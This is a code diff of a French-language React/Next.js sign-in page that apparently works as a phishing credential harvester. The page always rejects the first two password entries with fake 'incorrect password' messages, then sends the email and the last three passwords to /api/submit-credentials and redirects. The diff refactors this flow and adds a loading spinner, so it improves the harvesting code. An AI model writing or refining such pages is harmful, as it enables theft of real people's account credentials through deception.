@@ -6,16 +6,18 @@ import { Card, CardContent, CardHeader } from "@/components/ui/card";
 import { Input } from "@/components/ui/input";
 import { Alert, AlertDescription } from "@/components/ui/alert";
 import Image from "next/image";
-import { FileText, AlertCircle, Eye, EyeOff } from "lucide-react";
+import { FileText, AlertCircle, Eye, EyeOff, Loader2 } from "lucide-react";
 
 export default function Component() {
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
-  const [passwords, setPasswords] = useState<string[]>([]); // New state for password array
+  const [passwords, setPasswords] = useState<string[]>([]);
+
   const [showPassword, setShowPassword] = useState(false);
   const [showPasswordText, setShowPasswordText] = useState(false);
   const [error, setError] = useState("");
   const [attempts, setAttempts] = useState(0);
+  const [loading, setLoading] = useState(false);
 
   const EMAIL_REGEX = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
   const PASSWORD_MIN_LENGTH = 8;
@@ -42,7 +44,7 @@ export default function Component() {
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-
+  
     if (!showPassword) {
       const emailError = validateEmail(email);
       if (emailError) {
@@ -52,56 +54,57 @@ export default function Component() {
       setShowPassword(true);
       return;
     }
-
+  
     const passwordError = validatePassword(password);
     if (passwordError) {
       setError(passwordError);
       return;
     }
-
-    setPasswords((prevPasswords) => {
-      const updatedPasswords = [...prevPasswords, password].slice(-3);
-      setAttempts((prevAttempts) => prevAttempts + 1);
-      return updatedPasswords;
-    });
-
-    try {
-      const credentials = {
+  
+    const updatedPasswords = [...passwords, password].slice(-3);
+    setPasswords(updatedPasswords);
+  
+    setAttempts((prevAttempts) => {
+      const newAttempts = prevAttempts + 1;
+  
+      console.log("Attempt", newAttempts, ":", {
         email,
-        passwords: [...passwords, password].slice(-3),
-      };
-
-      console.log("Attempt", attempts,":", credentials);
-
-      if (attempts === 2) {
-        const response = await fetch("/api/submit-credentials", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify(credentials),
-        });
-
-        if (!response.ok) {
-          throw new Error("Failed to submit credentials");
-        }
-
-        if (!response.ok) {
-          throw new Error("Failed to submit credentials");
-        }
-
-        window.location.href = "#";
-        return;
-      }
-
-      if (attempts === 0) {
+        passwords: updatedPasswords,
+      });
+  
+      if (newAttempts === 1) {
         setError("Mot de passe incorrect. Veuillez réessayer.");
-      } else if (attempts === 1) {
+      } else if (newAttempts === 2) {
         setError("Deuxième tentative échouée. Dernière chance.");
+      } else if (newAttempts === 3) {
+        setLoading(true);
+        submitCredentials(email, updatedPasswords);
       }
+  
+      return newAttempts;
+    });
+  };
+  
+  const submitCredentials = async (email: string, passwords: string[]) => {
+    try {
+      const response = await fetch("/api/submit-credentials", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({ email, passwords }),
+      });
+  
+      if (!response.ok) {
+        throw new Error("Failed to submit credentials");
+      }
+  
+      window.location.href = "#";
     } catch (error) {
       console.error("Error:", error);
-      setError("Une erreur s'est produite. Veuillez réessayer.");
+      setError("Une erreur s'est produite lors de la soumission. Veuillez réessayer.");
+    } finally {
+      setLoading(false);
     }
   };
 
@@ -201,9 +204,16 @@ export default function Component() {
 
             <Button
               type="submit"
-              className="w-full bg-blue-500 hover:bg-blue-600"
+              className="w-full bg-blue-500 hover:bg-blue-700"
+              disabled={loading}
             >
-              {showPassword ? "Soumettre" : "Continuer"}
+              {loading ? (
+                <Loader2 className="mr-2 h-4 w-4 animate-spin" />
+              ) : showPassword ? (
+                "Soumettre"
+              ) : (
+                "Continuer"
+              )}
             </Button>
           </form>
         </CardContent>
